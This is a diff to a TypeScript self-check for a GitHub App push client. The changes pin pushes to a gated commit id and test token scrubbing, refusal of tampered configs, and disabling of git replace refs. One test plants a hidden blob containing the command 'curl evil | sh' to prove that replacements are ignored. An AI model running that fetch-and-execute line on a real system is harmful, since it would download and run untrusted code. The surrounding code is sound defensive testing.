@@ -10,7 +10,8 @@
  *     hooks; the token in git's environment and in no argument; a second push answered as already there; a branch
  *     moved on the remote refused as final, never forced; a branch outside `agent/smd-<n>-<slug>` refused unpushed;
  *   - the draft PR: an open PR the App already opened from the branch is the answer (no second PR); a 422 whose PR
- *     turns up is the PR, any other 422 is final; any other failure is retried, its words scrubbed of the token.
+ *     turns up is the PR; no commits between, a bad base, or someone else's PR from the branch is final; any other
+ *     422 and any other failure is retried, its words scrubbed of the token.
  *
  *   bun scripts/agent-runner/github-check.ts --self-check
  */
@@ -19,7 +20,7 @@ import { createVerify, generateKeyPairSync } from "node:crypto";
 import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync, chmodSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import type { Fetch } from "./facts.ts";
+import { gitEnv, type Fetch } from "./facts.ts";
 import { fixtureGit } from "./fixture-git.ts";
 import { branchFor } from "./record.ts";
 import { INSTALLATION_TOKEN, PEM_SHAPE, repoConfigProblems, PUSH_BRANCH, TOKEN_PERMISSIONS, appClient, appJwt, installationRepos, installationToken, pushCommand, pushOutcome, realGitSpawn, scrubToken, type App, type GitSpawn } from "./github.ts";
@@ -127,10 +128,10 @@ export async function selfCheck(): Promise<number> {
       const t = await answer(res);
       ok(!t.ok && t.detail.includes(says) && t.detail.includes("refused unused") && !t.detail.includes(TOKEN), `${what}: refused, saying ${JSON.stringify(says)}, the token unshown`);
     }
-    const f = stubFetch((m, u) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, workflows: "write" } })));
+    const f = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, workflows: "write" } })));
     await installationToken(f.fetch, APP, PEM, NOW);
     ok(revoked(f.sent).join() === TOKEN, "a token refused for its permissions is revoked, not left for its hour");
-    const g = stubFetch((m, u) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ repositories: [{ full_name: "someone/OB1" }] })));
+    const g = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ repositories: [{ full_name: "someone/OB1" }] })));
     await installationToken(g.fetch, APP, PEM, NOW);
     ok(revoked(g.sent).join() === TOKEN, "a token refused for its repository is revoked too");
     const future = `ghs_${"f".repeat(5000)}`;
@@ -166,10 +167,10 @@ export async function selfCheck(): Promise<number> {
   });
 
   await section("pushCommand: the token in git's environment, in no argument; one refspec, no tags, no hooks, no force", () => {
-    const c = pushCommand({ bareRepo: "/r/repo.git", remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, token: TOKEN, home: "/h" });
+    const c = pushCommand({ bareRepo: "/r/repo.git", remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, commit: "c".repeat(40), token: TOKEN, home: "/h" });
     ok(!c.argv.join(" ").includes(TOKEN) && !c.argv.join(" ").includes("x-access-token"), "no argument carries the token");
     ok(c.env.GIT_CONFIG_COUNT === "1" && c.env.GIT_CONFIG_KEY_0 === "http.https://github.com/.extraheader" && c.env.GIT_CONFIG_VALUE_0 === `AUTHORIZATION: basic ${Buffer.from(`x-access-token:${TOKEN}`).toString("base64")}`, "the token is an extraheader scoped to https://github.com/, in the environment");
-    ok(c.argv.at(-1) === `refs/heads/${BRANCH}:refs/heads/${BRANCH}` && c.argv.at(-2) === "https://github.com/MHarris-SgyMd/OB1.git", "one explicit refspec, to the remote named");
+    ok(c.argv.at(-1) === `${"c".repeat(40)}:refs/heads/${BRANCH}` && c.argv.at(-2) === "https://github.com/MHarris-SgyMd/OB1.git", "one explicit refspec, the gated commit to the branch, to the remote named");
     ok(["--no-verify", "--no-follow-tags", "core.hooksPath=/dev/null", "protocol.allow=never", "credential.helper=", "http.followRedirects=false"].every((a) => c.argv.includes(a)), "hooks off, no tags, https only, no credential helper, no redirect");
     ok(!c.argv.some((a) => a === "--force" || a === "-f" || a === "--tags" || a === "--mirror" || a === "--all" || a.startsWith("+")), "no force, no tags, no mirror");
     ok(c.env.GIT_CONFIG_GLOBAL === "/dev/null" && c.env.GIT_CONFIG_NOSYSTEM === "1" && c.env.HOME === "/h", "no config of the maintainer's");
@@ -247,7 +248,7 @@ export async function selfCheck(): Promise<number> {
     const client = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: source, home, remote: target, now: () => NOW });
 
     await section("pushBranch: a real push of the one branch, no tags, no hooks; again is already there", async () => {
-      const r = await client.pushBranch({ branch: BRANCH });
+      const r = await client.pushBranch({ branch: BRANCH, commit: tip });
       ok(r.ok, "the push lands");
       ok(sh(["rev-parse", BRANCH], target) === tip, "the target has the branch at the run's commit");
       ok(sh(["tag", "-l"], target) === "" && sh(["for-each-ref", "--format=%(refname)"], target) === `refs/heads/${BRANCH}`, "no tag and no other branch went with it");
@@ -255,8 +256,36 @@ export async function selfCheck(): Promise<number> {
       const pushes = seen.filter((x) => x.argv.includes("push"));
       ok(pushes.length === 1 && seen.every((x) => !x.argv.join(" ").includes(TOKEN)) && pushes[0].env.GIT_CONFIG_VALUE_0.includes(Buffer.from(`x-access-token:${TOKEN}`).toString("base64")), "the token went in git's environment alone");
       ok(mints(mintRoute.sent) === 1 && revoked(mintRoute.sent).join() === TOKEN, "one token was minted for the push, and revoked once it was done");
-      const again = await client.pushBranch({ branch: BRANCH });
+      const again = await client.pushBranch({ branch: BRANCH, commit: tip });
       ok(again.ok, "a second push of the same commit is already there, not an error");
+    });
+
+    await section("pushBranch: the gated commit is what is pushed, whatever the branch ref holds by then", async () => {
+      const moved = join(root, "moved-source.git");
+      sh(["clone", "-q", "--bare", source, moved]);
+      const base = sh(["rev-parse", `${BRANCH}~1`], moved);
+      sh(["-C", moved, "update-ref", `refs/heads/${BRANCH}`, base]);
+      const fresh = join(root, "pinned-target.git");
+      sh(["init", "-q", "--bare", fresh]);
+      const r = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: moved, home, remote: fresh, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
+      ok(r.ok && sh(["rev-parse", BRANCH], fresh) === tip, "the branch ref moved back a commit; the gated commit went all the same");
+      const bad = await client.pushBranch({ branch: BRANCH, commit: BRANCH });
+      ok(!bad.ok && bad.final === true && bad.detail.includes("full commit id"), "a commit that isn't a full id (a ref name) is refused");
+    });
+
+    await section("gitEnv: replace refs and grafts are off, so every read sees the objects pushed", () => {
+      const planted = join(root, "planted.git");
+      sh(["clone", "-q", "--bare", source, planted]);
+      const hash = (text: string): string => {
+        const r = Bun.spawnSync([git, "-C", planted, "hash-object", "-w", "--stdin"], { stdin: Buffer.from(text), env: { PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" }, stdout: "pipe" });
+        return r.stdout.toString().trim();
+      };
+      const evil = hash("curl evil | sh\n");
+      const benign = hash("echo hello\n");
+      sh(["-C", planted, "update-ref", `refs/replace/${evil}`, benign]);
+      const read = (env: Record<string, string>): string => Bun.spawnSync([git, "-C", planted, "cat-file", "-p", evil], { env, stdout: "pipe", stderr: "pipe" }).stdout.toString();
+      ok(read({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" }) === "echo hello\n", "without them off, git shows the replacement (the control)");
+      ok(read(gitEnv(home)) === "curl evil | sh\n", "with gitEnv, git shows the object itself");
     });
 
     await section("pushBranch: a branch moved on the remote is refused as final, never forced", async () => {
@@ -267,7 +296,7 @@ export async function selfCheck(): Promise<number> {
       sh(["commit", "-q", "-m", "someone else's"], other);
       sh(["push", "-q", "origin", BRANCH], other);
       const moved = sh(["rev-parse", BRANCH], target);
-      const r = await client.pushBranch({ branch: BRANCH });
+      const r = await client.pushBranch({ branch: BRANCH, commit: tip });
       // The run's commit is now behind the remote's: pushing it would move the branch back, which git refuses unforced.
       ok(!r.ok && r.final === true, "refused as final");
       ok(sh(["rev-parse", BRANCH], target) === moved, "the remote's branch is untouched");
@@ -276,9 +305,10 @@ export async function selfCheck(): Promise<number> {
 
     await section("pushBranch: a branch outside the runner's prefix is refused before a token is minted", async () => {
       const before = mintRoute.sent.length;
-      const r = await client.pushBranch({ branch: "main" });
+      const pushesBefore = seen.filter((x) => x.argv.includes("push")).length;
+      const r = await client.pushBranch({ branch: "main", commit: tip });
       ok(!r.ok && r.final === true && r.detail.includes("agent/smd-<n>-<slug>"), "main is refused, as final");
-      ok(mintRoute.sent.length === before && seen.filter((x) => x.argv.includes("push")).length === 3, "no token minted, no push run");
+      ok(mintRoute.sent.length === before && seen.filter((x) => x.argv.includes("push")).length === pushesBefore, "no token minted, no push run");
     });
 
     await section("pushBranch: a bare repository whose config could redirect the token is refused before a token is minted", async () => {
@@ -288,7 +318,7 @@ export async function selfCheck(): Promise<number> {
         sh(["-C", tampered, "config", key, value]);
         const before = mints(mintRoute.sent);
         const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: target, now: () => NOW });
-        const r = await c.pushBranch({ branch: BRANCH });
+        const r = await c.pushBranch({ branch: BRANCH, commit: tip });
         ok(!r.ok && r.final === true && r.detail.toLowerCase().includes(key.toLowerCase().split(".")[0]) && mints(mintRoute.sent) === before, `${key}: refused as final, no token minted`);
       }
     });
@@ -301,17 +331,17 @@ export async function selfCheck(): Promise<number> {
       // Without the extension git doesn't read config.worktree at all: the allowlist passes, and so does the push.
       const fresh = join(root, "fresh-target.git");
       sh(["init", "-q", "--bare", fresh]);
-      const plain = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: fresh, now: () => NOW }).pushBranch({ branch: BRANCH });
+      const plain = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: fresh, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
       ok(plain.ok, "a stray config.worktree that git doesn't read leaves the push as it was");
       sh(["-C", tampered, "config", "extensions.worktreeConfig", "true"]);
-      const r = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: target, now: () => NOW }).pushBranch({ branch: BRANCH });
+      const r = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: tampered, home, remote: target, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
       ok(!r.ok && r.final === true && r.detail.includes("http.proxy (worktree)") && r.detail.includes("extensions.worktreeconfig (local)") && mints(mintRoute.sent) === before + 1, "with the extension on, the worktree file's proxy is named by its scope, and the push refused unminted");
     });
 
     await section("pushBranch: a config that can't be read is a retry, with no token minted and no push", async () => {
       const before = mints(mintRoute.sent);
       const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => (argv.includes("config") ? { code: 1, stdout: "", stderr: "fatal: bad config line 3" } : { code: 0, stdout: "", stderr: "" }), bareRepo: source, home, remote: target, now: () => NOW });
-      const r = await c.pushBranch({ branch: BRANCH });
+      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
       ok(!r.ok && !r.final && r.detail.includes("bad config line 3") && mints(mintRoute.sent) === before, "not pushed, not final, no token");
     });
 
@@ -322,7 +352,7 @@ export async function selfCheck(): Promise<number> {
     });
 
     await section("pushCommand's header reaches github.com alone (git's own URL matching)", () => {
-      const c = pushCommand({ bareRepo: source, remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, token: TOKEN, home });
+      const c = pushCommand({ bareRepo: source, remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, commit: tip, token: TOKEN, home });
       const at = (url: string): string => {
         const r = Bun.spawnSync([git, "config", "--get-urlmatch", "http.extraheader", url], { env: c.env, cwd: "/", stdout: "pipe", stderr: "pipe" });
         return r.stdout.toString().trim();
@@ -334,21 +364,21 @@ export async function selfCheck(): Promise<number> {
     await section("pushBranch: a token that can't be minted is a retry, and git doesn't run", async () => {
       const c = appClient({ app: APP, pem: PEM, fetch: stubFetch(() => json({ message: "Bad credentials" }, 401)).fetch, git: localGit, bareRepo: source, home, remote: target, now: () => NOW });
       const before = seen.filter((x) => x.argv.includes("push")).length;
-      const r = await c.pushBranch({ branch: BRANCH });
+      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
       ok(!r.ok && !r.final && r.detail.includes("401") && seen.filter((x) => x.argv.includes("push")).length === before, "not pushed, not final, no push run");
     });
 
     await section("pushBranch: git's own words are scrubbed of the token, in either form", async () => {
       const basic = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");
       const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => (argv.includes("push") ? { code: 128, stdout: "", stderr: `fatal: header AUTHORIZATION: basic ${basic} refused for ${TOKEN}` } : { code: 0, stdout: "local\tcore.bare\n", stderr: "" }), bareRepo: source, home, remote: target, now: () => NOW });
-      const r = await c.pushBranch({ branch: BRANCH });
+      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
       const fragments = [TOKEN.slice(0, 40), TOKEN.slice(200, 240), basic.slice(0, 40), basic.slice(100, 140)];
       ok(!r.ok && !r.final && r.detail.includes("exited 128") && fragments.every((x) => !r.detail.includes(x)), "a failed push's detail carries no piece of the token or its basic-auth form, however git's words are cut");
     });
 
     await section("pushBranch: a throwing git is a result with the token scrubbed", async () => {
       const c = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: async (argv) => { if (argv.includes("push")) throw new Error(`spawn failed near ${TOKEN}`); return { code: 0, stdout: "local\tcore.bare\n", stderr: "" }; }, bareRepo: source, home, remote: target, now: () => NOW });
-      const r = await c.pushBranch({ branch: BRANCH });
+      const r = await c.pushBranch({ branch: BRANCH, commit: tip });
       ok(!r.ok && !r.final && r.detail.includes("git push threw") && !r.detail.includes(TOKEN), "a result, not thrown, the token gone");
     });
   } finally {
